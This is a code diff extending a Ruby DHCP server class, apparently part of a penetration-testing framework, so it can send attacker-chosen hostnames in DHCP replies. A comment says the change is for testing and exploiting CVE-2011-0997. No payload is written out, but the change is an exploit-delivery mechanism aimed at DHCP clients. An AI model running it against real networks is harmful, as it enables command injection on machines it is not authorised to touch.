@@ -12,6 +12,9 @@ module DHCP
 # DHCP Server class
 # not completely configurable - written specifically for a PXE server
 # - scriptjunkie
+#
+# extended to support testing/exploiting CVE-2011-0997
+# - apconole@yahoo.com
 ##
 
 class Server
@@ -82,6 +85,17 @@ class Server
 		else
 			self.servePXE = false
 		end
+
+		# Always assume we don't give out hostnames ...
+		self.give_hostname = false
+		if (hash['HOSTNAME'])
+			self.give_hostname = true
+			self.served_hostname = hash['HOSTNAME']
+			self.served_over = 0
+			if ( hash['HOSTSTART'] )
+				self.served_over = hash['HOSTSTART'].to_i
+			end
+		end
 		
 		self.leasetime = 600
 		self.relayip = "\x00\x00\x00\x00" # relay ip - not currently suported
@@ -116,7 +130,8 @@ class Server
 	def set_option(opts)
 		allowed_options = [
 			:serveOnce, :servePXE, :relayip, :leasetime, :dnsserv,
-			:pxeconfigfile, :pxepathprefix, :pxereboottime, :router
+			:pxeconfigfile, :pxepathprefix, :pxereboottime, :router,
+			:give_hostname, :served_hostname, :served_over
 		]
 
 		opts.each_pair { |k,v|
@@ -144,6 +159,7 @@ class Server
 	attr_accessor :sock, :thread, :myfilename, :ipstring, :served, :serveOnce
 	attr_accessor :current_ip, :start_ip, :end_ip, :broadcasta, :netmaskn
 	attr_accessor :servePXE, :pxeconfigfile, :pxepathprefix, :pxereboottime
+	attr_accessor :give_hostname, :served_hostname, :served_over
 
 protected
 
@@ -263,6 +279,12 @@ protected
 			pkt << [DHCPAck].pack('C')
 			# now we ignore their discovers (but we'll respond to requests in case a packet was lost)
 			self.served.merge!( buf[28..43] => true ) 
+			if ( self.served_over != 0 )
+				# NOTE: this is sufficient for low-traffic net
+				# for high-traffic, this will probably lead to
+				# hostname collision
+				self.served_over += 1
+			end
 		else
 			#dlog("ignoring unknown DHCP request - type #{messageType}")
 			return
@@ -278,6 +300,16 @@ protected
 		pkt << dhcpoption(OpPXEConfigFile, self.pxeconfigfile)
 		pkt << dhcpoption(OpPXEPathPrefix, self.pxepathprefix)
 		pkt << dhcpoption(OpPXERebootTime, [self.pxereboottime].pack('N'))
+		if ( self.give_hostname == true )
+			send_hostname = self.served_hostname
+			if ( self.served_over != 0 )
+				# NOTE : see above comments for the 'uniqueness'
+				# of this value
+				send_hostname += self.served_over.to_s
+			end
+			pkt << dhcpoption(OpHostname, send_hostname)
+		end
+
 		pkt << dhcpoption(OpEnd)
 
 		pkt << ("\x00" * 32) #padding
